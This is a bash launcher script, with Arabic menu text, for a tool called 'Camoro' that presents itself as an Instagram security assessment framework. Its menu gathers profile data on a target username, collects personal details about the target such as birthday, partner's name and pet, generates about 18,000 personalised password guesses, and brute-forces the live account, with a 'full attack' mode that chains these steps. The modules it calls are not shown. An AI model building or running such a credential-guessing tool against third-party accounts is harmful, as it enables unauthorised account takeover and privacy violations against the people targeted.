#!/bin/bash

# Camoro - Instagram Security Assessment Tool
# Author: Security Professional
# Version: 2.0.0

GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

BANNER="
${PURPLE}╔══════════════════════════════════════════════════════════╗
║                                                      ║
${CYAN}     ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗  ██████╗ 
    ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔═══██╗
    ██║     ███████║██╔████╔██║██║   ██║██████╔╝██║   ██║
    ██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██║   ██║
    ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║╚██████╔╝
     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
${PURPLE}║                                                      ║
║   ${WHITE}Instagram Security Assessment Framework${PURPLE}         ║
║   ${YELLOW}Version: 2.0.0 | AI-Powered Password Analysis${PURPLE}  ║
║                                                      ║
╚══════════════════════════════════════════════════════════╝${NC}
"

show_menu() {
    clear
    echo -e "$BANNER"
    echo ""
    echo -e "${CYAN}  [1]${WHITE} 🔍  جمع معلومات الحساب${NC}"
    echo -e "${CYAN}  [2]${WHITE} 🧠  توليد كلمات المرور بالذكاء الاصطناعي${NC}"
    echo -e "${CYAN}  [3]${WHITE} ⚡  اختبار كلمات المرور (Brute Force)${NC}"
    echo -e "${CYAN}  [4]${WHITE} 🔄  الوضع الكامل (جمع + توليد + اختبار)${NC}"
    echo -e "${CYAN}  [5]${WHITE} 📋  عرض النتائج${NC}"
    echo -e "${RED}  [0]${WHITE} 🚪  خروج${NC}"
    echo ""
    echo -ne "${YELLOW}  اختر رقم: ${NC}"
    read -r choice
    
    case $choice in
        1) gather_info ;;
        2) generate_passwords ;;
        3) brute_force ;;
        4) full_attack ;;
        5) show_results ;;
        0) exit 0 ;;
        *) echo -e "${RED}  [!] اختيار غير صحيح${NC}"; sleep 2; show_menu ;;
    esac
}

gather_info() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║        🔍 معلومات الحساب                  ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -ne "${YELLOW}[?] أدخل اسم المستخدم المستهدف: ${NC}"
    read -r username
    
    if [ -z "$username" ]; then
        echo -e "${RED}[!] اسم المستخدم مطلوب${NC}"
        sleep 2
        gather_info
        return
    fi
    
    echo -e "${CYAN}[*] جاري جمع المعلومات عن: ${WHITE}$username${NC}"
    
    # Run info gathering module
    cd "$(dirname "$0")"
    python modules/info_gather.py --username "$username"
    
    if [ -f "results/${username}/info.json" ]; then
        echo ""
        echo -e "${GREEN}[✓] تم جمع المعلومات بنجاح!${NC}"
        
        # Display gathered info
        python -c "
import json
with open('results/${username}/info.json') as f:
    data = json.load(f)
print('')
print('╔══════════════════════════════════════════╗')
print('║           📊 معلومات الحساب               ║')
print('╚══════════════════════════════════════════╝')
for key, value in data.items():
    if value:
        print(f'  {key}: {value}')
print('')
"
        
        # Ask for birthday
        echo ""
        echo -ne "${YELLOW}[?] هل تعرف تاريخ الميلاد؟ (Y/N): ${NC}"
        read -r has_birthday
        
        if [[ "$has_birthday" == "Y" || "$has_birthday" == "y" ]]; then
            echo -ne "${YELLOW}[?] أدخل تاريخ الميلاد (YYYY-MM-DD): ${NC}"
            read -r birthday
            echo "$birthday" > "results/${username}/birthday.txt"
            echo -e "${GREEN}[✓] تم حفظ تاريخ الميلاد${NC}"
        fi
        
        # Ask for known info
        echo ""
        echo -e "${CYAN}[*] معلومات إضافية عن الهدف (اترك فارغاً للانتهاء):${NC}"
        echo -ne "${YELLOW}[?] الاسم الحقيقي: ${NC}"
        read -r real_name
        echo -ne "${YELLOW}[?] اسم الحبيب/الشريك: ${NC}"
        read -r partner_name
        echo -ne "${YELLOW}[?] هواية مفضلة: ${NC}"
        read -r hobby
        echo -ne "${YELLOW}[?] حيوان أليف: ${NC}"
        read -r pet
        echo -ne "${YELLOW}[?] مدينة/بلد: ${NC}"
        read -r city
        echo -ne "${YELLOW}[?] رقم مفضل: ${NC}"
        read -r fav_number
        echo -ne "${YELLOW}[?] كلمة مفتاحية (أي شيء تعرفه): ${NC}"
        read -r keyword
        
        # Save all info
        python3 -c "
import json
info = json.load(open('results/${username}/info.json'))
info['real_name'] = '$real_name'
info['partner_name'] = '$partner_name'
info['hobby'] = '$hobby'
info['pet'] = '$pet'
info['city'] = '$city'
info['fav_number'] = '$fav_number'
info['keyword'] = '$keyword'
json.dump(info, open('results/${username}/info.json', 'w'), indent=2)
"
        echo -e "${GREEN}[✓] تم حفظ جميع المعلومات!${NC}"
    else
        echo -e "${RED}[!] فشل في جمع المعلومات. تحقق من اسم المستخدم.${NC}"
    fi
    
    echo ""
    echo -ne "${YELLOW}اضغط Enter للعودة...${NC}"
    read
    show_menu
}

generate_passwords() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║     🧠 توليد كلمات المرور بالذكاء الاصطناعي    ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -ne "${YELLOW}[?] أدخل اسم المستخدم: ${NC}"
    read -r username
    
    if [ ! -f "results/${username}/info.json" ]; then
        echo -e "${RED}[!] لم يتم جمع معلومات هذا الحساب بعد. استخدم الخيار 1 أولاً.${NC}"
        echo -ne "${YELLOW}اضغط Enter للعودة...${NC}"
        read
        show_menu
        return
    fi
    
    echo -e "${CYAN}[*] جاري توليد ~18,000 كلمة مرور ذكية...${NC}"
    python modules/password_gen.py --username "$username"
    
    if [ -f "results/${username}/passwords.txt" ]; then
        COUNT=$(wc -l < "results/${username}/passwords.txt")
        echo -e "${GREEN}[✓] تم توليد ${COUNT} كلمة مرور!${NC}"
    fi
    
    echo ""
    echo -ne "${YELLOW}اضغط Enter للعودة...${NC}"
    read
    show_menu
}

brute_force() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║     ⚡ اختبار كلمات المرور (Brute Force)     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -ne "${YELLOW}[?] أدخل اسم المستخدم: ${NC}"
    read -r username
    
    if [ ! -f "results/${username}/passwords.txt" ]; then
        echo -e "${RED}[!] لا توجد كلمات مرور مولدة. استخدم الخيار 2 أولاً.${NC}"
        echo -ne "${YELLOW}اضغط Enter للعودة...${NC}"
        read
        show_menu
        return
    fi
    
    COUNT=$(wc -l < "results/${username}/passwords.txt")
    echo -e "${YELLOW}[*] سيتم اختبار ${COUNT} كلمة مرور على الحساب: ${WHITE}${username}${NC}"
    echo -e "${RED}[!] تنبيه: هذه العملية قد تستغرق وقتاً${NC}"
    echo ""
    echo -ne "${YELLOW}[?] هل تريد البدء؟ (Y/N): ${NC}"
    read -r confirm
    
    if [[ "$confirm" == "Y" || "$confirm" == "y" ]]; then
        echo -e "${CYAN}[*] جاري اختبار كلمات المرور...${NC}"
        python modules/brute_force.py --username "$username"
    fi
    
    echo ""
    echo -ne "${YELLOW}اضغط Enter للعودة...${NC}"
    read
    show_menu
}

full_attack() {
    clear
    echo -e "${PURPLE}╔══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║     🔄 الوضع الكامل - الهجوم الشامل       ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -ne "${YELLOW}[?] أدخل اسم المستخدم المستهدف: ${NC}"
    read -r username
    
    if [ -z "$username" ]; then
        echo -e "${RED}[!] اسم المستخدم مطلوب${NC}"
        sleep 2
        full_attack
        return
    fi
    
    # Step 1: Gather Info
    echo -e "${CYAN}[1/5] 🔍 جمع معلومات الحساب...${NC}"
    python modules/info_gather.py --username "$username"
    
    if [ ! -f "results/${username}/info.json" ]; then
        echo -e "${RED}[!] فشل في البدء. تحقق من اسم المستخدم.${NC}"
        sleep 2
        show_menu
        return
    fi
    
    # Step 2: Ask for known info
    echo ""
    echo -e "${YELLOW}[*] هل لديك معلومات إضافية عن الهدف؟${NC}"
    echo -ne "${YELLOW}[?] هل تعرف تاريخ الميلاد؟ (Y/N): ${NC}"
    read -r has_bd
    if [[ "$has_bd" == "Y" || "$has_bd" == "y" ]]; then
        echo -ne "${YELLOW}[?] تاريخ الميلاد (YYYY-MM-DD): ${NC}"
        read -r bd
        python3 -c "
import json
info = json.load(open('results/${username}/info.json'))
info['birthday'] = '$bd'
json.dump(info, open('results/${username}/info.json', 'w'), indent=2)
"
    fi
    
    echo -ne "${YELLOW}[?] الاسم الحقيقي: ${NC}"
    read -r rn
    echo -ne "${YELLOW}[?] كلمة مفتاحية: ${NC}"
    read -r kw
    
    python3 -c "
import json
info = json.load(open('results/${username}/info.json'))
info['real_name'] = '$rn'
info['keyword'] = '$kw'
json.dump(info, open('results/${username}/info.json', 'w'), indent=2)
"
    
    # Step 3: Generate Passwords
    echo -e "${CYAN}[2/5] 🧠 توليد كلمات المرور بالذكاء الاصطناعي...${NC}"
    python modules/password_gen.py --username "$username"
    
    PASS_COUNT=$(wc -l < "results/${username}/passwords.txt" 2>/dev/null || echo 0)
    echo -e "${GREEN}[✓] تم توليد ${PASS_COUNT} كلمة مرور${NC}"
    
    # Step 4: Show some generated passwords
    echo ""
    echo -e "${YELLOW}[*] نموذج من كلمات المرور المولدة:${NC}"
    head -20 "results/${username}/passwords.txt" | while read -r line; do
        echo -e "  ${RED}✗${NC} $line"
    done
    echo -e "  ${CYAN}... وآلاف غيرها${NC}"
    
    # Step 5: Start brute force
    echo ""
    echo -e "${CYAN}[3/5] ⚡ بدء اختبار كلمات المرور...${NC}"
    echo -ne "${YELLOW}[?] هل تريد بدء الهجوم؟ (Y/N): ${NC}"
    read -r start_attack
    
    if [[ "$start_attack" == "Y" || "$start_attack" == "y" ]]; then
        python modules/brute_force.py --username "$username"
    fi
    
    # Show final results
    show_results "$username"
    
    echo ""
    echo -ne "${YELLOW}اضغط Enter للعودة...${NC}"
    read
    show_menu
}

show_results() {
    username=$1
    if [ -z "$username" ]; then
        clear
        echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║        📋 عرض النتائج                     ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
        echo ""
        echo -ne "${YELLOW}[?] أدخل اسم المستخدم: ${NC}"
        read -r username
    fi
    
    if [ -f "results/${username}/success.txt" ]; then
        echo ""
        echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║        ✅ تم العثور على كلمة المرور!      ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
        cat "results/${username}/success.txt"
    elif [ -f "results/${username}/tested.txt" ]; then
        TESTED=$(wc -l < "results/${username}/tested.txt")
        echo ""
        echo -e "${YELLOW}╔══════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║       📊 إحصائيات الاختبار               ║${NC}"
        echo -e "${YELLOW}╚══════════════════════════════════════════╝${NC}"
        echo -e "  كلمات المرور المختبرة: ${TESTED}"
        echo -e "  لم يتم العثور على كلمة مرور صحيحة حتى الآن."
    else
        echo ""
        echo -e "${RED}[!] لا توجد نتائج لهذا الحساب${NC}"
    fi
}

# Start
mkdir -p results
show_menu
